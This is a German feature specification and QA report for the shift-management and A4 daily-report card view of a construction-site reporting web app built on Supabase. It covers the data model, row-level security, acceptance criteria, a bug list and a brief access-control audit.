# PROJ-3: Schichtverwaltung & Kartenansicht

## Status: In Review
**Created:** 2026-03-12
**Last Updated:** 2026-03-22

## Implementation Notes

**Backend (Supabase):**
- Tabellen `shifts`, `shift_workers`, `shift_equipment` angelegt (Migration: `proj3_shifts_tables`)
- RLS-Kette: `shifts.project_id → projects.user_id = auth.uid()`; `shift_workers`/`shift_equipment` via `shifts → projects`
- CASCADE DELETE: Löschen einer Schicht entfernt automatisch Workers und Equipment
- UNIQUE constraint auf `(project_id, datum, typ)` — max. 1 Tagschicht + 1 Nachtschicht pro Tag
- `updated_at` wird via Trigger bei jedem UPDATE aktualisiert
- Direkter Supabase Browser-Client (keine API-Routes) — absichtlich gemäß Tech Design

**Frontend:**
- Implementiert in `src/app/projekte/[id]/page.tsx` (Seite + alle CRUD-Handler)
- Komponenten: `KWNavigation`, `ShiftGrid`, `EmptySlot`, `ZoomControls`, `DeleteShiftDialog`
- `ShiftCard` (`src/components/shift-card.tsx`) enthält das komplette A4-Kartenlayout inkl. aller editierbaren Felder — wurde gemeinsam mit dem Grid implementiert (= Inhalt von PROJ-4)
- Druckfunktion (`handlePrintShift`, `handlePrintKW`) bereits implementiert in `page.tsx`
- Firmenname/Adresse/Logo: werden aus `companies` (PROJ-5) gelesen — `adr`, `logo_url`, `logo_x`, `logo_y` werden mit PROJ-5 zur `companies`-Tabelle hinzugefügt; bis dahin Platzhalter-Fallback

---

## Kernprinzip: Die Karte ist das Dokument (WYSIWYG)

Der BTB wird nicht in einem Formular erfasst und dann in ein separates Drucklayout überführt. **Die Schicht-Karte auf dem Bildschirm ist bereits das fertige Dokument.** Was der Nutzer sieht, wird exakt so gedruckt.

- Die Karte hat A4-Proportionen (210:297mm) und einen weißen Hintergrund — sie simuliert ein Blatt Papier
- Das Kartenlayout entspricht 1:1 dem HTML-Prototyp (Firmenname, Sektionen, Fußzeile)
- Eingabefelder sind im Dokumentstil gestaltet (kein auffälliger Browser-Rahmen)
- Zoom (40–100%) skaliert die gesamte Karte via `transform: scale()` — nichts bricht das Layout
- PROJ-4 (Drucken) kann direkt auf diese Karte aufsetzen — kein zweites Template nötig

---

## Dependencies

| Feature | Art | Liefert |
|---------|-----|---------|
| PROJ-1 | Pflicht | Auth-Session (`user_id`) für RLS |
| PROJ-2 | Pflicht | `project_id`, `lz_von`/`lz_bis` (Leistungszeitraum), Projektname, Kostenstelle, Auftraggeber |
| PROJ-5 | Optional (lesend) | **Firmenname, Adresse, Logo** (`companies`-Tabelle) für Karten-Header + Wasserzeichen; Fallback wenn nicht vorhanden |
| PROJ-6 | Optional (lesend) | **Quick-Button-Labels** (`project_categories`) für Personal/Geräte; Fallback auf Standard-Liste |

> PROJ-5 stellt Firmendaten bereit (global für alle Projekte der Firma). PROJ-6 stellt projekt-spezifische Quick-Buttons bereit. PROJ-3 schreibt niemals in PROJ-5- oder PROJ-6-Tabellen.

---

## User Stories
- Als Nutzer möchte ich nach Klick auf ein Projekt die Wochenkarten-Ansicht sehen, um Schichten zu verwalten.
- Als Nutzer möchte ich eine Kalenderwochen-Navigation sehen, damit ich schnell zur richtigen Woche springe.
- Als Nutzer möchte ich im KW-Chip sehen, ob Tag/Nacht-Schichten vorhanden sind (Dot-Raster).
- Als Nutzer möchte ich für einen Tag eine Tag- oder Nachtschicht anlegen.
- Als Nutzer möchte ich alle Felder einer Schicht direkt auf der Karte ausfüllen — und dabei schon sehen, wie das fertige Dokument aussieht.
- Als Nutzer möchte ich die Daten des Vortags übernehmen, damit ich nicht alles neu eintippen muss.
- Als Nutzer möchte ich eine Schicht löschen, wenn sie versehentlich angelegt wurde.
- Als Nutzer möchte ich, dass meine Eingaben sofort gespeichert werden (Auto-Save).
- Als Nutzer möchte ich Mitarbeiter per Quick-Button hinzufügen (Bauleiter, Polier, Vorarbeiter etc.).
- Als Nutzer möchte ich Geräte per Quick-Button hinzufügen (ZWB, Kettenbagger, Radlader etc.).
- Als Nutzer möchte ich den Zoom der Karten anpassen (40–100%), damit ich mehr auf einmal sehe.

---

## Acceptance Criteria

### Karten-Darstellung (WYSIWYG / A4)
- [ ] ShiftCard hat festes A4-Seitenverhältnis (`aspect-ratio: 210 / 297`)
- [ ] Karte hat weißen Hintergrund (#ffffff), dunkle App-Chrome drumherum
- [ ] Zoom-Buttons (40%, 50%, 60%, 75%, 100%) stehen fix rechts in der KW-Navigationsleiste (kein Mitscrollen); skalieren die gesamte Karte via `transform: scale()` — Einstellung wird in localStorage gespeichert
- [ ] Kartenlayout entspricht exakt dem HTML-Prototyp:
  - **Header:** Firmenname (groß, bold, aus PROJ-5) + Adresse (klein, darunter, aus PROJ-5) links; "BAUTAGESBERICHT WOCHENTAG, TT.MM.JJJJ" rechts + Schicht-Badge (Tagschicht gelb / Nachtschicht blau); Fallback: "Firmenname" / Adresse leer
  - **Sektion 1 (3 Spalten):** PROJEKT | WETTER | ARBEITSZEIT
  - **Sektion 2:** ÖRTLICHKEIT
  - **Sektion 3 (2 Spalten):** KOLONNE / MITARBEITER | GERÄTE & MASCHINEN
  - **Sektion 4:** AUSGEFÜHRTE ARBEITEN
  - **Sektion 5:** VORKOMMNISSE / BEHINDERUNGEN
  - **Fußzeile:** Auftragnehmer (links) | Auftraggeber (rechts), durch Linie getrennt
- [ ] Eingabefelder ohne sichtbaren Browser-Rahmen — Text wirkt wie gedruckt; Rahmen nur bei Fokus subtil sichtbar
- [ ] Hover über ausgefüllte Karte zeigt Aktions-Buttons (Drucken, Löschen) überlagert

### KW-Navigation
- [ ] KW-Navigationsleiste zeigt alle Kalenderwochen des Leistungszeitraums horizontal scrollbar
- [ ] Aktive KW ist farblich hervorgehoben (grün / acc3 Rand)
- [ ] Jeder KW-Chip zeigt: "KW X", Datumsbereich, Dot-Raster
  - Dot-Raster: immer 7 Punkte (Mo–So); Zeile 1 = Tagschichten, Zeile 2 = Nachtschichten
  - Gelb = Tagschicht vorhanden, Blau = Nachtschicht vorhanden, Grau = leer, Transparent = außerhalb Leistungszeitraum
- [ ] Klick auf KW-Chip lädt nur Tage dieser KW, die im Leistungszeitraum liegen
- [ ] Beim Öffnen eines Projekts wird die aktuelle KW geladen (falls im Zeitraum), sonst erste KW
- [ ] Leistungszeitraum nicht gesetzt → Hinweis: "Bitte Leistungszeitraum im Projekt festlegen"

### Karten-Grid
- [ ] Grid zeigt AUSSCHLIESSLICH Tage innerhalb des Leistungszeitraums (keine Platzhalter für Tage außerhalb)
- [ ] Wenn eine KW nur 2 Tage im Leistungszeitraum hat → Grid hat 2 Spalten
- [ ] Grid hat 2 Zeilen: Zeile 1 = Tagschichten, Zeile 2 = Nachtschichten
- [ ] Leerer Slot zeigt Platzhalter-Karte (A4-proportional, dunkler Hintergrund):
  - Tagschicht-Placeholder: Sonnen-Icon, Wochentag, Datum, gelber gestrichelter Rahmen
  - Nachtschicht-Placeholder: Mond-Icon, Wochentag, Datum, blauer gestrichelter Rahmen
  - Button "Neue Schicht anlegen": erstellt Leerformular, übernimmt aber Strecke/Gleis/KM vom Vortag (falls vorhanden)
  - Button "Vortag übernehmen": kopiert ALLE Felder inkl. Mitarbeiter und Geräte vom letzten vorhandenen Eintrag

### Schicht-Karte (inline editierbar)
- [ ] Pro Kalendertag maximal eine Tagschicht und eine Nachtschicht
- [ ] Neue Schicht kann leer oder als Kopie des Vortags angelegt werden
- [ ] Felder auf der Karte:
  - **PROJEKT-Sektion:** Name (aus PROJ-2, read-only), Kostenstelle (aus PROJ-2, read-only), Auftraggeber (aus PROJ-2, read-only)
  - **WETTER-Sektion:** Temperatur (°C), Witterung (Dropdown), Bodenzustand (Dropdown)
  - **ARBEITSZEIT-Sektion:** Beginn (time), Ende (time), Pause (Minuten) → Nettostunden berechnet + read-only
  - **ÖRTLICHKEIT-Sektion:** Gleis/Strecke/Bauteil, km von, km bis
  - **MITARBEITER-Tabelle:** Zeilen (Beruf/Name, Anzahl, Stunden, Löschen-Button) + Quick-Buttons + Gesamt-Stundenzeile am Ende; Quick-Buttons (PROJ-5 oder Fallback: Bauleiter, Polier, Vorarbeiter, Facharbeiter, Logistiker, NU, + Individuell); Quick-Add befüllt Std automatisch mit Nettostunden wenn Arbeitszeit bekannt
  - **GERÄTE-Tabelle:** identische Struktur wie Mitarbeiter-Tabelle; Quick-Buttons (PROJ-5 oder Fallback: ZWB, Kettenbagger, Gleisbauanhänger, Gleisbauanhänger + Mulde, Radlader, Stromaggregat, Merlo, + Individuell)
  - **AUSGEFÜHRTE ARBEITEN:** mehrzeiliges Textfeld (auto-resize)
  - **VORKOMMNISSE / BEHINDERUNGEN:** mehrzeiliges Textfeld (auto-resize)
- [ ] Nettostunden = (Ende − Beginn) − Pause; bei Nachtschicht (Ende < Beginn) korrekt über Mitternacht berechnet
- [ ] Bei Eingabe von Beginn/Ende werden Nettostunden automatisch in Mitarbeiter- und Geräte-Zeilen eingetragen (überschreibbar)
- [ ] Mitarbeiter- und Geräte-Zeilen können einzeln gelöscht werden
- [ ] Auto-Save: onBlur für Textfelder, direkt bei Select-/Zeit-Änderungen (Supabase upsert)
- [ ] Löschen einer Schicht zeigt Bestätigungs-Dialog

---

## Edge Cases
- Leistungszeitraum nur 1 Tag → Grid zeigt genau diesen einen Tag
- Beginn = Ende → Nettostunden = 0
- Pause > Gesamtdauer → Nettostunden = 0
- Vortag hat keine Schicht → "Vortag übernehmen" legt leere Schicht an
- Nachtschicht: Datum-Label zeigt "Mo/Di, 10./11. Mär" statt einzelnem Datum
- Zoom bei 40% → Karten sehr klein, Inputs nicht bedienbar (akzeptiert — nur Überblick)
- KW auf Jahreswechsel → Jahresanzeige korrekt (z.B. "KW 1 '26")
- PROJ-5 nicht eingerichtet → Firmenname-Platzhalter + hardcodierte Quick-Button-Fallbacks
- Gleichzeitiges Bearbeiten in zwei Tabs → last-write-wins (kein Konflikt-Handling in MVP)

---

## Technical Requirements
- Route: `/projekte/[id]` → Projektdetailseite mit KW-Nav + Karten-Grid
- Supabase Tabellen:
  - `shifts` (id, project_id, datum, typ [tag|nacht], beg, end, pau, temp, wit, bod, gl, kv, kb, arb, vor, created_at, updated_at)
  - `shift_workers` (id, shift_id, beruf, anz, std)
  - `shift_equipment` (id, shift_id, typ, anz, std)
- Liest (nur): `projects` (PROJ-2), `user_settings` / `user_categories` (PROJ-5, mit Fallback)
- RLS: Über `project_id → projects.user_id = auth.uid()` gesichert; CASCADE Delete auf shift_workers + shift_equipment
- KW-Berechnung: date-fns + hardcodierte KW-Tabelle 2024–2029 (konsistent mit HTML-Prototyp)
- CSS Grid: 2 Zeilen × n Spalten; `transform: scale()` für Zoom am A4-Container
- Dunkles Design: #0e1118 Hintergrund, #e8c547 Gelb, #4ecb8d Grün, #4a7cf7 Blau
- Keine neuen Pakete nötig (date-fns, @supabase/supabase-js, shadcn/ui bereits installiert)

---
<!-- Sections below are added by subsequent skills -->

## Tech Design (Solution Architect)

### Komponentenstruktur

```
/projekte/[id] (Seite)
+-- ProjectDetailHeader
|   +-- Zurück-Link → /projekte
|   +-- Projektname + Leistungszeitraum
|   +-- ⚙️ Einstellungs-Icon (rechts) → /projekte/[id]/einstellungen (PROJ-6)
|
+-- KW-Navigation (sticky, flex-row)
|   +-- KW-Chip-Liste (horizontal scroll, ScrollArea, flex-1)
|   |   +-- KW-Chip (je Kalenderwoche im Leistungszeitraum)
|   |       +-- "KW X" + Datumsbereich (z.B. "KW 12, 17.–23. Mär")
|   |       +-- Dot-Raster: 2 Zeilen × n Spalten (Tage im Zeitraum)
|   |           +-- Zeile 1 (Tagschicht): gelb = vorhanden, grau = leer
|   |           +-- Zeile 2 (Nachtschicht): blau = vorhanden, grau = leer
|   +-- ZoomControls (fix rechts, kein Scroll) (40% | 50% | 60% | 75% | 100%)
|
+-- SchichtenGrid (CSS Grid: 2 Zeilen × n Spalten)
|   +-- [Zeile 1: Tagschichten]
|   |   +-- ShiftCard (ausgefüllt) ODER EmptySlot (je Tag)
|   +-- [Zeile 2: Nachtschichten]
|       +-- ShiftCard (ausgefüllt) ODER EmptySlot (je Tag)
|
+-- EmptySlot (A4-proportional, dunkler Hintergrund)
|   +-- Icon (Sonne = Tag, Mond = Nacht) + Wochentag + Datum
|   +-- Gestrichelter Rahmen (gelb = Tag, blau = Nacht)
|   +-- "Neue Schicht anlegen" Button (Leerformular + Örtlichkeit vom Vortag)
|   +-- "Vortag übernehmen" Button (alle Felder inkl. MA + Geräte)
|
+-- ShiftCard (A4-Karte, weißer Hintergrund, inline editierbar)
|   +-- KartenHeader
|   |   +-- Firmenname groß + Adresse klein darunter (aus PROJ-5 / Fallback)
|   |   +-- "BAUTAGESBERICHT WOCHENTAG, TT.MM.JJJJ"
|   |   +-- Schicht-Badge (Tagschicht / Nachtschicht)
|   +-- Sektion1 (3 Spalten)
|   |   +-- ProjektSection (Name, Kostenstelle, Auftraggeber – read-only aus PROJ-2)
|   |   +-- WetterSection (Temperatur, Witterung-Select, Bodenzustand-Select)
|   |   +-- ArbeitszeitSection (Beginn, Ende, Pause, Nettostunden berechnet)
|   +-- OertlichkeitSection (Gleis/Strecke/Bauteil, km von, km bis)
|   +-- Sektion3 (2 Spalten)
|   |   +-- MitarbeiterTabelle (Zeilen: Beruf/Name, Anz, Std + QuickButtons)
|   |   +-- GeraeteTabelle (Zeilen: Typ, Anz, Std + QuickButtons)
|   +-- ArbeitenTextarea (auto-resize)
|   +-- VorkommnisseTextarea (auto-resize)
|   +-- KartenFooter (Auftragnehmer | Auftraggeber)
|   +-- [bei Hover: Drucken-Button, Löschen-Button]
|
+-- DeleteShiftDialog (shadcn/ui AlertDialog)
```

---

### Datenmodell

**Tabelle `shifts`** – Kernschicht

| Feld | Typ | Pflicht | Beschreibung |
|------|-----|---------|--------------|
| id | UUID | Auto | Primärschlüssel |
| project_id | UUID | ✅ | FK → projects.id |
| datum | Date | ✅ | Kalendertag der Schicht |
| typ | Text | ✅ | `tag` oder `nacht` |
| beg | Time | — | Arbeitsbeginn |
| end | Time | — | Arbeitsende |
| pau | Integer | — | Pause in Minuten |
| temp | Integer | — | Temperatur (°C) |
| wit | Text | — | Witterung |
| bod | Text | — | Bodenzustand |
| gl | Text | — | Gleis/Strecke/Bauteil |
| kv | Text | — | km von |
| kb | Text | — | km bis |
| arb | Text | — | Ausgeführte Arbeiten |
| vor | Text | — | Vorkommnisse/Behinderungen |
| created_at / updated_at | Timestamp | Auto | |

**Tabelle `shift_workers`**

| Feld | Typ | Beschreibung |
|------|-----|--------------|
| id | UUID | Primärschlüssel |
| shift_id | UUID | FK → shifts.id (CASCADE DELETE) |
| beruf | Text | Berufsbezeichnung/Name |
| anz | Integer | Anzahl Personen |
| std | Decimal | Stunden |

**Tabelle `shift_equipment`**

| Feld | Typ | Beschreibung |
|------|-----|--------------|
| id | UUID | Primärschlüssel |
| shift_id | UUID | FK → shifts.id (CASCADE DELETE) |
| typ | Text | Gerätetyp |
| anz | Integer | Anzahl |
| std | Decimal | Stunden |

**Gelesen aus PROJ-5 (Firmendaten, nur lesend, mit Fallback):**

| Tabelle | Feld | Verwendung in PROJ-3 |
|---------|------|----------------------|
| `companies` | `name` | Firmenname im Karten-Header (groß, bold) |
| `companies` | `adr` | Adresse des Auftragnehmers im Karten-Header (klein, darunter) |
| `companies` | `logo_url`, `logo_x`, `logo_y` | Logo-Wasserzeichen auf der Karte |

**Gelesen aus PROJ-6 (Projekt-Quick-Buttons, nur lesend, mit Fallback):**

| Tabelle | Feld | Verwendung in PROJ-3 |
|---------|------|----------------------|
| `project_categories` | `typ`, `label`, `sort_order` | Quick-Button-Labels für Mitarbeiter/Geräte |

> Firmenname, Adresse und Logo gelten für alle Projekte der Firma (konfigurierbar in `/einstellungen`). Quick-Buttons sind projekt-spezifisch (konfigurierbar in `/projekte/[id]/einstellungen`).

---

### Sicherheitsmodell (RLS-Kette)

**Aktueller Stand (nach PROJ-5 Migration 20260320):**
```
Zugriffsbedingung für projects (und alle davon abhängigen Tabellen):
  (projects.company_id IS NOT NULL
   AND projects.company_id = (SELECT company_id FROM profiles WHERE user_id = auth.uid())
   AND EXISTS (SELECT 1 FROM companies WHERE id = projects.company_id AND is_active = true))
  OR
  (projects.company_id IS NULL AND projects.created_by = auth.uid())

shifts.project_id → projects (obige Bedingung)
shift_workers.shift_id → shifts → projects (obige Bedingung)
shift_equipment.shift_id → shifts → projects (obige Bedingung)
```

---

### Tech-Entscheidungen

| Entscheidung | Gewählt | Warum |
|---|---|---|
| Kartenformat | `aspect-ratio: 210 / 297`, weißer Hintergrund | WYSIWYG: Bildschirm = Druck, kein zweites Template |
| Zoom | `transform: scale()` auf A4-Container + localStorage | Kein Re-Render, Einstellung bleibt erhalten |
| KW-Berechnung | date-fns + hardcodiert 2024–2029 | Konsistent mit HTML-Prototyp, kein Server-Roundtrip |
| Auto-Save | onBlur (Textfelder) + onChange (Selects/Zeiten) → Supabase upsert | Kein "Speichern"-Button nötig |
| Firmenname | Aus PROJ-5 `user_settings.firma`, Fallback "Firmenname" | PROJ-3 läuft auch ohne PROJ-5 |
| Quick-Buttons | `user_categories` (PROJ-5) mit hardcodierten Fallbacks | PROJ-3 läuft auch ohne PROJ-5 |
| Vortag übernehmen | Client-seitig: Objekt klonen + INSERT | Kein Server-Endpoint nötig |
| Nachtschicht-Erkennung | Ende < Beginn → über Mitternacht | Einfache Regel, wie im Prototyp |

---

## QA Test Results

**Tested:** 2026-03-22 | **Tester:** QA Engineer (AI) | **Build:** PASS (npm run build erfolgreich, 0 TypeScript-Fehler)
**Getestete Dateien:**
- `src/app/projekte/[id]/page.tsx` (935 Zeilen -- Haupt-Seite + CRUD-Handler + Print)
- `src/components/shift-card.tsx` (623 Zeilen -- A4-Karte)
- `src/components/kw-navigation.tsx` (KW-Chips + Zoom + Print-Button)
- `src/components/shift-grid.tsx` (2-Zeilen-Grid mit Slots)
- `src/components/empty-slot.tsx` (Platzhalter-Karte)
- `src/components/delete-shift-dialog.tsx` (AlertDialog)
- `src/lib/kw-utils.ts` (KW-Berechnung)
- `src/lib/validations/shift.ts` (Interfaces + Defaults)

---

### Acceptance Criteria: Karten-Darstellung (WYSIWYG / A4)

| # | Kriterium | Status | Anmerkung |
|---|-----------|--------|-----------|
| AC-K1 | ShiftCard hat A4-Seitenverhaeltnis | PASS | `shift-card.tsx:436` `width: '210mm', height: '297mm'` |
| AC-K2 | Karte hat weissen Hintergrund | PASS | `background: '#fff'` (Zeile 437) |
| AC-K3 | Zoom-Buttons (40-100%) fix rechts, localStorage | PASS | `ZoomSlider` in `kw-navigation.tsx:66-103`, `localStorage` in `page.tsx:20-30` |
| AC-K4 | Header: Firmenname + Adresse links, BTB-Titel + Badge rechts | PASS | `shift-card.tsx:449-465`, Firmenname aus `project.firm`, Fallback "Firmenname" |
| AC-K5 | Sektion 1 (3 Spalten): Projekt, Wetter, Arbeitszeit | PASS | `shift-card.tsx:468-530` |
| AC-K6 | Sektion 2: Oertlichkeit | PASS | `shift-card.tsx:534-538` |
| AC-K7 | Sektion 3 (2 Spalten): Mitarbeiter, Geraete | PASS | `shift-card.tsx:542-588` |
| AC-K8 | Sektion 4: Ausgefuehrte Arbeiten | PASS | `shift-card.tsx:592-596` mit RichTextArea |
| AC-K9 | Sektion 5: Vorkommnisse | PASS | `shift-card.tsx:600-604` mit RichTextArea |
| AC-K10 | Fusszeile: Auftragnehmer / Auftraggeber | PASS | `shift-card.tsx:607-619` absolute Position bottom 7mm |
| AC-K11 | Eingabefelder ohne sichtbaren Rahmen | PASS | `inputStyle` hat `border: 'none'`, nur `borderBottom` subtil |
| AC-K12 | Hover ueber Karte zeigt Drucken + Loeschen | PASS | `shift-grid.tsx:49-72` Slot-Komponente mit `group-hover:opacity-100` Overlay |

### Acceptance Criteria: KW-Navigation

| # | Kriterium | Status | Anmerkung |
|---|-----------|--------|-----------|
| AC-N1 | KW-Leiste zeigt alle KWs horizontal scrollbar | PASS | `kw-navigation.tsx:136` `overflow-x-auto flex` |
| AC-N2 | Aktive KW farblich hervorgehoben (gruen) | PASS | `border-[#4ecb8d] bg-[#4ecb8d]/10` (Zeile 147) |
| AC-N3 | KW-Chip: "KW X", Datumsbereich, Dot-Raster | PASS | `kw-navigation.tsx:151-160`, DotRaster-Komponente |
| AC-N4 | Dot-Raster: 7 Punkte, gelb=Tag, blau=Nacht, grau=leer | FAIL | Spec sagt "Gelb = Tagschicht vorhanden", Code zeigt `bg-[#4ecb8d]` (gruen) fuer Tagschichten. Nachtschicht ist blau `bg-[#4a7cf7]` (korrekt). Siehe **BUG-S3-1**. |
| AC-N5 | Klick auf KW laedt nur Tage im Leistungszeitraum | PASS | `getKWsForRange()` berechnet nur Tage innerhalb lz_von/lz_bis per `daysInRange` |
| AC-N6 | Beim Oeffnen aktuelle KW geladen | PASS | `getCurrentKWIndex()` in `page.tsx:256` |
| AC-N7 | Leistungszeitraum nicht gesetzt -> Hinweis | PASS | `page.tsx:861-874` zeigt Hinweis-Box |

### Acceptance Criteria: Karten-Grid

| # | Kriterium | Status | Anmerkung |
|---|-----------|--------|-----------|
| AC-G1 | Grid zeigt NUR Tage im Leistungszeitraum | PASS | `daysInRange` aus `getKWsForRange()`, keine Platzhalter fuer Tage ausserhalb |
| AC-G2 | KW mit 2 Tagen -> Grid hat 2 Spalten | PASS | `gridTemplateColumns: repeat(${days.length}, ...)` in `shift-grid.tsx:112` |
| AC-G3 | 2 Zeilen: Tagschichten oben, Nachtschichten unten | PASS | `shift-grid.tsx:116-163` rendert erst alle Tag-Slots, dann Nacht-Slots |
| AC-G4 | Leerer Slot: A4-proportional, dunkler Hintergrund | PASS | `empty-slot.tsx:26-27` `width: '210mm', height: '297mm', background: '#0e1118'` |
| AC-G5 | Tag-Platzhalter: Sonnen-Icon, gelber Rahmen | PASS (teilweise) | Sonnen-Icon vorhanden, aber kein gestrichelter Rahmen in der Implementierung. Stattdessen solid border. |
| AC-G6 | "Neue Schicht anlegen" + "Vortag uebernehmen" Buttons | PASS | `empty-slot.tsx:38-51` |

### Acceptance Criteria: Schicht-Karte (inline editierbar)

| # | Kriterium | Status | Anmerkung |
|---|-----------|--------|-----------|
| AC-S1 | Pro Tag max eine Tag- und eine Nachtschicht | PASS | DB-Constraint UNIQUE auf `(project_id, datum, typ)` laut Spec |
| AC-S2 | Neue Schicht leer oder als Kopie | PASS | `handleCreateShift` + `handleCopyPreviousDay` in `page.tsx:428-530` |
| AC-S3 | Felder: Projekt read-only, Wetter, Arbeitszeit, Oertlichkeit | PASS | Alles vorhanden in `shift-card.tsx:468-538` |
| AC-S4 | Mitarbeiter-Tabelle mit Quick-Buttons | PASS | `shift-card.tsx:544-563` |
| AC-S5 | Geraete-Tabelle mit Quick-Buttons | PASS | `shift-card.tsx:566-586` |
| AC-S6 | Nettostunden = (Ende - Beginn) - Pause | PASS | `calculateNetHours` in kw-utils, `shift-card.tsx:392` |
| AC-S7 | Nachtschicht (Ende < Beginn) korrekt | PASS | `shift-card.tsx` / `page.tsx:557`: `if (total < 0) total += 24 * 60` |
| AC-S8 | Std werden bei Zeitaenderung in MA/Geraete uebernommen | PASS | `handleTimeBlur` in `shift-card.tsx:395-413` updatet alle Workers + Equipment |
| AC-S9 | MA/Geraete einzeln loeschbar | PASS | `WorkerRow` und `EquipmentRow` haben x-Button |
| AC-S10 | Auto-Save: onBlur fuer Text, direkt bei Select | PASS | `handleBlur`, `handleNumberBlur`, `handleTimeBlur` + `onUpdateShift` mit onChange fuer Selects |
| AC-S11 | Loeschen zeigt Bestaetigungsdialog | PASS | `DeleteShiftDialog` in `page.tsx:925-932` |

---

### Edge Cases

| # | Edge Case | Status | Anmerkung |
|---|-----------|--------|-----------|
| E1 | Leistungszeitraum nur 1 Tag | PASS | `getKWsForRange` gibt 1 Tag in `daysInRange` zurueck |
| E2 | Beginn = Ende -> Nettostunden = 0 | PASS | `calculateNetHours` gibt 0 zurueck |
| E3 | Pause > Gesamtdauer -> Nettostunden = 0 | PASS | Code: `total > 0 ? ... : 0` |
| E4 | Vortag hat keine Schicht -> leere Schicht | PASS | `handleCopyPreviousDay:468-480`: wenn kein prevShift, inseriert ohne Feldwerte |
| E5 | Nachtschicht-Datum: "Mo/Di, 10./11." | PASS | `formatNightShiftDate` in kw-utils |
| E6 | Zoom 40% -> Karten klein, Inputs nicht bedienbar | PASS (akzeptiert) | `transform: scale(0.4)` -- Ueberblick-Modus laut Spec |
| E7 | KW auf Jahreswechsel | PASS | `getISOWeekYear` aus date-fns, Jahresanzeige in KW-Chip |
| E8 | PROJ-5 nicht eingerichtet -> Fallback | PASS | `project?.firm \|\| 'Firmenname'`, DEFAULT_WORKER/EQUIPMENT_CATEGORIES |
| E9 | Gleichzeitiges Bearbeiten in zwei Tabs | PASS (akzeptiert) | last-write-wins, kein Konflikt-Handling (Spec-konform fuer MVP) |

---

### Bug-Liste

#### BUG-S3-1: Dot-Raster verwendet Gruen statt Gelb fuer Tagschichten
- **Severity:** Low
- **Datei:** `src/components/kw-navigation.tsx:46`
- **Beschreibung:** Spec sagt "Gelb = Tagschicht vorhanden". Code verwendet `bg-[#4ecb8d]` (Gruen) fuer Tagschichten. Nachtschicht ist korrekt blau. Das gesamte Design verwendet Gruen als aktive Akzentfarbe (auch KW-Chip-Rand), daher ist dies moeglicherweise eine bewusste Designentscheidung, widerspricht aber der Spec.
- **Reproduktion:** Projekt mit Tagschichten oeffnen, KW-Chip-Dots beobachten.
- **Erwartetes Verhalten:** Gelber Dot (`bg-[#e8c547]`) fuer Tagschichten.

#### BUG-S3-2: Stille Fehler bei allen Schicht-CRUD-Operationen
- **Severity:** Medium
- **Dateien:** `src/app/projekte/[id]/page.tsx:450-452, 527-529, 586-588, 639-641, 664-666, 680-682, 718-720, 743-745, 759-761`
- **Beschreibung:** Alle CRUD-Handler (createShift, copyPreviousDay, updateShift, addWorker, updateWorker, deleteWorker, addEquipment, updateEquipment, deleteEquipment) haben leere catch-Bloecke (`// silent fail for MVP`). Bei Netzwerk-Fehlern oder RLS-Verletzungen erhaelt der Nutzer kein Feedback. Optimistic Updates koennen zu Diskrepanzen zwischen UI und DB fuehren.
- **Reproduktion:** Offline gehen, Schicht bearbeiten -- Aenderung scheint gespeichert, geht beim Reload verloren.
- **Erwartetes Verhalten:** Mindestens eine Toast-Nachricht bei Fehler.

#### BUG-S3-3: Fehlende Oertlichkeits-Felder "km von" und "km bis" auf der Karte
- **Severity:** Medium
- **Datei:** `src/components/shift-card.tsx:534-538`
- **Beschreibung:** Die Spec definiert Felder `kv` (km von) und `kb` (km bis) in der Oertlichkeit-Sektion. Das Datenmodell hat diese Felder (`shifts.kv`, `shifts.kb`). Die ShiftCard zeigt aber NUR das `gl`-Feld (Gleis/Strecke/Bauteil) in einer einzeiligen Darstellung. Die km-Felder sind weder auf der Karte noch im Druck sichtbar.
- **Reproduktion:** Schicht oeffnen -- unter "Oertlichkeit" fehlen km-Eingabefelder.
- **Erwartetes Verhalten:** Drei Felder: Gleis/Strecke/Bauteil, km von, km bis.

#### BUG-S3-4: Vortag-Kopie sucht nur exakten Vortag (Datum -1), nicht "letzten vorhandenen Eintrag"
- **Severity:** Low
- **Datei:** `src/app/projekte/[id]/page.tsx:456`
- **Beschreibung:** Spec sagt "Vortag uebernehmen: kopiert ALLE Felder vom letzten vorhandenen Eintrag". Code sucht `addDays(new Date(datum), -1)` -- nur den exakten Vortag. Wenn Freitag eine Schicht hat und Montag "Vortag uebernehmen" geklickt wird, wird eine leere Schicht angelegt (weil Sonntag keine Schicht hat).
- **Reproduktion:** Freitag-Schicht ausfuellen, Montag "Vortag uebernehmen" klicken.
- **Erwartetes Verhalten:** Suche rueckwaerts nach letztem vorhandenen Eintrag desselben Typs.

#### BUG-S3-5: Neue-Schicht-Button-Text sagt "Tagschicht/Nachtschicht anlegen" aber Spec sagt "Neue Schicht anlegen"
- **Severity:** Low
- **Datei:** `src/components/empty-slot.tsx:43`
- **Beschreibung:** Spec sagt Button-Text "Neue Schicht anlegen". Implementierung zeigt "Tagschicht anlegen" / "Nachtschicht anlegen". Dies ist moeglicherweise eine bewusste UX-Verbesserung (klarer welcher Typ angelegt wird), widerspricht aber dem exakten Spec-Wortlaut.
- **Status:** Diskutierbar -- UX ist besser als Spec.

#### BUG-S3-6: Empty-Slot hat keinen gestrichelten Rahmen
- **Severity:** Low
- **Datei:** `src/components/empty-slot.tsx:28-29`
- **Beschreibung:** Spec sagt "gelber gestrichelter Rahmen" fuer Tagschicht, "blauer gestrichelter Rahmen" fuer Nachtschicht. Die Implementierung hat `border: '1px solid rgba(255,255,255,0.13)'` -- einen einheitlichen halbtransparenten weissen Rahmen, nicht gestrichelt und nicht farblich unterschieden.
- **Reproduktion:** Projekt mit leeren Slots oeffnen.

---

### Security Audit (Red-Team)

| # | Check | Status | Anmerkung |
|---|-------|--------|-----------|
| SEC-S3-1 | RLS-Kette shifts -> projects | PASS | Migration Zeile 173-201: shifts prueft project_id -> projects mit vollstaendiger company/solo-Bedingung |
| SEC-S3-2 | RLS shift_workers/shift_equipment | PASS | Migration Zeile 217-293: Gleiche Kette ueber shifts -> projects |
| SEC-S3-3 | CASCADE DELETE | PASS | shifts -> workers/equipment per CASCADE DELETE |
| SEC-S3-4 | Kein project_id Check bei Schicht-Insert | MEDIUM | `handleCreateShift` (Zeile 431) inseriert `project_id: projectId` ohne serverseitige Validierung, ob der Nutzer Zugriff auf dieses Projekt hat. RLS schuetzt dies auf DB-Ebene, aber ein Angreifer koennte die projektId im Client-Code manipulieren. RLS faengt dies ab. |
